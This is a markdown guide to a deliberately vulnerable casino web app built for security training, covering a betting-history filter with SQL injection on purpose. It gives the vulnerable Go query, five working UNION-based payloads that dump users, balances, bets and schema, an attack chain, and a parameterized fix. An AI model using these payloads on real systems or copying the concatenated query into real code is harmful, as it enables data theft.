# 🎲 Betting History with SQL Injection - User Guide

## ✅ Implementation Complete

The betting history tab has been successfully integrated into the user profile with the SQL injection vulnerability.

---

## 🎯 What Was Implemented

### Backend Changes
- **File:** `casino-back/internal/handlers/bets.go`
- **Endpoint:** `GET /api/bets?filter=<date>`
- **Vulnerability:** SQL Injection via unsanitized `filter` parameter

### Frontend Changes
- **File:** `ruleta/app/routes/user-profile.tsx`
- **Features:**
  - ✅ Tabbed interface (Profile Info | Betting History)
  - ✅ Date filter input field
  - ✅ Real-time betting history display
  - ✅ SQL injection payload suggestions
  - ✅ Visual indicators for injection results

---

## 🚀 How to Use

### 1. Start the Application

**Backend:**
```bash
cd casino-back
./start-server.sh
```

**Frontend:**
```bash
cd ruleta
npm run dev
```

### 2. Access the Feature

1. Navigate to `http://localhost:5173`
2. Register/Login to your account
3. Go to your profile (click on your username or navigate to `/user/profile/<id>`)
4. Click on the **"🎲 Betting History"** tab

---

## 🎲 Testing Normal Functionality

### View All Bets
1. Go to Betting History tab
2. Leave filter empty
3. Click "Filter" or it loads automatically
4. See all your bets

### Filter by Date
1. Enter a date: `2024-11-12`
2. Click "Filter"
3. See bets from that specific date

---

## 🚨 Testing SQL Injection Vulnerability

### Example Payloads

#### 1. Get All Users
```sql
2024-01-01' UNION SELECT id, user_id, username, email, '0.0', NULL, NULL, role, 0.0, created_at FROM users--
```

**What you'll see:**
- Bet records showing usernames in the "bet_type" field
- Emails in the "bet_value" field
- Red warning banners for entries from other users

#### 2. Get All Balances
```sql
2024-01-01' UNION SELECT b.id, b.user_id, u.username, u.email, b.amount, NULL, NULL, 'balance', b.amount, b.updated_at FROM balances b JOIN users u ON b.user_id = u.id--
```

**What you'll see:**
- Balance amounts in the "bet_amount" field
- Usernames and emails visible
- Total balance shown in statistics

#### 3. Get All Bets (Bypass User Filter)
```sql
2024-01-01' UNION SELECT * FROM bets WHERE '1'='1
```

**What you'll see:**
- Bets from ALL users in the system
- Red warnings for bets with different user_ids

#### 4. Get Specific User's Bets
```sql
2024-01-01' UNION SELECT * FROM bets WHERE user_id = 1 AND '1'='1
```

**What you'll see:**
- All bets from user with ID 1
- Even if you're not user 1

#### 5. Get Database Schema
```sql
2024-01-01' UNION SELECT 1, 2, name, type, '0.0', sql, NULL, '', 0.0, CURRENT_TIMESTAMP FROM sqlite_master WHERE type='table'--
```

**What you'll see:**
- Table names in "bet_type"
- Table types in "bet_value"
- SQL schema in "winning_number"

---

## 🎨 Visual Features

### Normal Bets Display
- 🟢 Green border for wins
- 🔴 Red border for losses
- ⚪ Gray border for pending

### SQL Injection Indicators
- 🚨 **Red warning banner** when a bet belongs to a different user
- Shows the actual user_id to confirm injection worked
- Clear visual distinction between your data and injected data

### Statistics Panel
- Total Bets count
- Total Wagered amount
- Total Won amount

---

## 📊 UI Elements

### Filter Section
```
┌─────────────────────────────────────────────┐
│ 📅 Filter by Date                           │
│ ┌──────────────────────┐ ┌──────┐ ┌──────┐│
│ │ 2024-11-12           │ │Filter│ │Clear ││
│ └──────────────────────┘ └──────┘ └──────┘│
└─────────────────────────────────────────────┘
```

### Betting History Card
```
┌─────────────────────────────────────────────┐
│ Bet #123                           ✅ WIN    │
│ 🎯 NUMBER: 17                               │
│ ┌──────────┬──────────┬──────────┬────────┐│
│ │Bet Amount│  Payout  │  Winning │  Date  ││
│ │  $50.00  │ $175.00  │    17    │11/12/24││
│ └──────────┴──────────┴──────────┴────────┘│
└─────────────────────────────────────────────┘
```

### SQL Injection Result
```
┌─────────────────────────────────────────────┐
│ ⚠️ SQL Injection Result: User ID: 5         │
└─────────────────────────────────────────────┘
```

---

## 🔗 Integration with Attack Chain

### Step 1: IDOR (A01)
Navigate to `/user/profile/1`, `/user/profile/2`, etc. to find user IDs

### Step 2: Token MD5 (A02)
Use obtained emails to generate reset tokens

### Step 3: SQL Injection (A03) ⬅️ THIS FEATURE
Use the betting history filter to:
- Discover all users in the system
- View balances of all accounts
- Identify high-value targets
- Analyze betting patterns

### Step 4: Race Condition (A04)
Attack high-balance accounts identified in step 3

---

## 🎯 Educational Value

This implementation demonstrates:

✅ **Real-world SQL Injection**
- User input directly concatenated into SQL
- No input validation or sanitization
- Exploitable with UNION-based injection

✅ **Visual Feedback**
- Clear indicators when injection succeeds
- Educational warnings and hints
- Example payloads provided in UI

✅ **Practical Attack Chain**
- Shows how vulnerabilities combine
- Demonstrates information gathering
- Illustrates privilege escalation path

---

## 🛠️ Technical Details

### Backend Vulnerability
```go
// VULNERABLE CODE
if filter != "" {
    query := "SELECT * FROM bets WHERE user_id = " + 
             strconv.Itoa(userID) + 
             " AND DATE(created_at) = '" + filter + "' ORDER BY created_at DESC"
    err = database.DB.Select(&bets, query)
}
```

### Frontend Implementation
```typescript
// Sends user input directly to backend
const endpoint = filter 
  ? `/api/bets?filter=${encodeURIComponent(filter)}`
  : '/api/bets';
```

**Note:** `encodeURIComponent()` only handles URL encoding, NOT SQL sanitization!

---

## 📱 Screenshots Locations

When testing, look for:

1. **Profile Tab** - User information (IDOR vulnerability)
2. **Betting History Tab** - Bet filtering (SQL Injection vulnerability)
3. **Red Warning Banner** - SQL Injection guide
4. **Filter Input** - Where to enter payloads
5. **Injected Results** - Red highlighted boxes

---

## ⚠️ Important Notes

### This is Educational Software
- ❌ Never use in production
- ❌ Never expose to internet
- ❌ Never attack real systems
- ✅ Only for learning and demonstration

### Security Best Practices (How to Fix)

**Backend Fix:**
```go
// SECURE CODE
if filter != "" {
    err = database.DB.Select(&bets, 
        `SELECT * FROM bets WHERE user_id = ? AND DATE(created_at) = ? ORDER BY created_at DESC`, 
        userID, filter)
}
```

**Frontend Best Practice:**
- Always validate input format
- Use date pickers instead of text input
- Implement client-side validation
- Show clear error messages

---

## 🧪 Testing Checklist

- [ ] Can access betting history tab
- [ ] Can see own bets without filter
- [ ] Can filter by valid date
- [ ] Can inject SQL to get users
- [ ] Can inject SQL to get balances
- [ ] Can inject SQL to get all bets
- [ ] Red warnings appear for injected data
- [ ] Statistics update correctly
- [ ] Can switch between tabs
- [ ] Can clear filter

---

## 📚 Related Documentation

- `A03-README.md` - Quick reference for SQL injection
- `VULNERABILITY-A03-SQL-INJECTION.md` - Complete technical docs
- `test-sql-injection.sh` - Backend testing script
- `test-sql-injection.py` - Python testing script

---

## 🎓 Learning Objectives

After using this feature, you should understand:

1. How SQL injection works in practice
2. Why parameterized queries are essential
3. How to identify SQL injection vulnerabilities
4. How attackers chain vulnerabilities together
5. The importance of input validation

---

**Last Updated:** November 12, 2025
**Status:** ✅ Ready for Testing
